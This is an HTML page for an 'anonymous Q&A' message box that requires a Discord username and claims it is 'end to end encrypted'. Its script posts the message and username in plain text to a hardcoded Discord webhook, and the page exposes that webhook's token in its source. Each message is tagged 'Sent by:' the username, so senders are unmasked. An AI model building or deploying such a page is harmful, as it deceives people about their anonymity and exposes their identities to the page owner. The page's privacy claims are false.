<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anonymous Q&A</title>
    <style>
        body {
            margin: 0; padding: 0; font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #ff3366 0%, #ff6633 100%);
            height: 100vh; display: flex; justify-content: center; align-items: center;
        }
        .main-container { width: 90%; max-width: 400px; display: flex; flex-direction: column; align-items: center; }
        .qa-card {
            background-color: white; border-radius: 20px; padding: 20px; width: 100%;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1); box-sizing: border-box;
        }
        .card-header { display: flex; align-items: center; margin-bottom: 15px; }
        .avatar { width: 40px; height: 40px; border-radius: 50%; margin-right: 10px; background: #eee; }
        .header-text { display: flex; flex-direction: column; }
        .username-label { font-weight: 700; font-size: 14px; color: #333; }
        .prompt-text { font-size: 14px; color: #333; }
        
        .input-group { margin-bottom: 15px; display: flex; flex-direction: column; gap: 8px; }
        .input-group input {
            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px;
            font-size: 14px; box-sizing: border-box; background: #fdfdfd; transition: border 0.3s;
        }

        /* Error styling for the username box if empty */
        .input-group input.error {
            border: 2px solid #ff3366;
            background: #fff0f0;
        }

        .message-area {
            position: relative; background: linear-gradient(to right, #ff99aa, #ffbbaa);
            border-radius: 15px; padding: 5px;
        }
        textarea {
            width: 100%; height: 100px; border: none; background: transparent;
            resize: none; padding: 15px; font-size: 18px; font-weight: 700;
            color: #222; box-sizing: border-box; outline: none;
        }
        .footer-text { color: white; font-size: 12px; margin: 15px 0; font-weight: 500; }
        #sendBtn {
            background-color: black; color: white; border: none; border-radius: 30px;
            padding: 15px 0; width: 100%; font-size: 18px; font-weight: 700; cursor: pointer;
        }
        #sendBtn:disabled { background-color: #444; cursor: not-allowed; }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="qa-card">
            <div class="card-header">
                <img src="https://via.placeholder.com/40/FF5733/FFFFFF?text=L" class="avatar">
                <div class="header-text">
                    <span class="username-label">@Linnn</span>
                    <span class="prompt-text">send me messages!</span>
                </div>
            </div>

            <div class="input-group">
                <input type="text" id="discordName" placeholder="Discord Username * (Required)">
                <input type="text" id="photoUrl" placeholder="Profile Photo Link (Optional)">
            </div>

            <div class="message-area">
                <textarea id="msg" placeholder="Write something..."></textarea>
            </div>
        </div>

        <div class="footer-text">ðŸ”’ anonymous   q&a discord username is required for server managment reason the username are end to end encrypted </div>

        <button id="sendBtn">Send!</button>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1466751890623565917/v-W-d0-Fqr2cWuYC6KmwgEy_yddydcWXkU_n0q05Pv_m1rtUBAP3KR2H55L3DO3MN7jh";

        document.getElementById('sendBtn').onclick = function() {
            const nameField = document.getElementById('discordName');
            const pic = document.getElementById('photoUrl').value.trim() || null;
            const message = document.getElementById('msg').value.trim();
            const name = nameField.value.trim();

            // 1. Check if username is empty
            if (!name) {
                nameField.classList.add('error');
                nameField.focus();
                return alert("Error: You must enter a Discord Username to send a message!");
            } else {
                nameField.classList.remove('error');
            }

            // 2. Check if message is empty
            if (!message) {
                return alert("Please type a message before sending.");
            }

            // Start sending process
            this.innerText = "Sending...";
            this.disabled = true;

            fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    username: name,
                    avatar_url: pic,
                    embeds: [{
                        title: "ðŸ“© New Message Received",
                        description: message,
                        color: 16724889,
                        footer: { text: `Sent by: ${name}` },
                        timestamp: new Date().toISOString()
                    }]
                })
            }).then((res) => {
                if (res.ok) {
                    alert("Success! Your message and username have been sent.");
                    document.getElementById('msg').value = "";
                    // Optional: keep the username there so they don't have to re-type it
                } else {
                    alert("Error: Discord rejected the message. Check if your image link is valid.");
                }
            }).catch(() => {
                alert("Connection Error! Please check your internet.");
            }).finally(() => {
                this.innerText = "Send!";
                this.disabled = false;
            });
        };

        // Remove error styling as soon as the user starts typing
        document.getElementById('discordName').oninput = function() {
            this.classList.remove('error');
        };
    </script>
</body>
</html>
